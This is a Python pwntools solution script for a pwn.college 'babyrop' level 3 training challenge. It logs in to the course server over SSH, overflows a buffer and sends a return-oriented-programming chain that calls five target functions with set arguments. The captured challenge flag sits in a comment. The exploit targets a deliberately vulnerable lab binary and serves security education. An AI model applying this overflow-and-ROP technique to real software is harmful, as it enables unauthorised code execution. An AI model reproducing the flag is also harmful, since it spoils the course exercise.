#!/usr/bin/env python3
#pwn_college{QUKfdI60VUQ_lkes7qXC9TgOvs_.dhTNywCN2gzW}
#python3 solution.py

from pwn import *

gadget_address = 0x401bc3

target_address_1 = 0x401a39
target_address_2 = 0x40199c
target_address_3 = 0x401862
target_address_4 = 0x4017c5
target_address_5 = 0x4018ff

arg_1 = 0x01
arg_2 = 0x02
arg_3 = 0x03
arg_4 = 0x04
arg_5 = 0x05

s = ssh(user="cse466", host="cse466.pwn.college", keyfile="/home/kali/.ssh/pwncollege-pwntool")
p = s.process("./babyrop_level3_testing1")
#p = process("./babyrop_level3_testing1")
#raw_input("attach gdb")

p.recvuntil("### Welcome to ./babyrop_level3_testing1!\n###")

#pad = cyclic(128, n=8)
pad = b'A' * cyclic_find("paaaaaaa", n=8)
payload = pad + p64(gadget_address) + p64(arg_1) + p64(target_address_1) + p64(gadget_address) + p64(arg_2) +  p64(target_address_2) + p64(gadget_address) + p64(arg_3) + p64(target_address_3) + p64(gadget_address) + p64(arg_4) + p64(target_address_4) + p64(gadget_address) + p64(arg_5) + p64(target_address_5)

print(payload)
p.sendline(payload)
p.interactive()

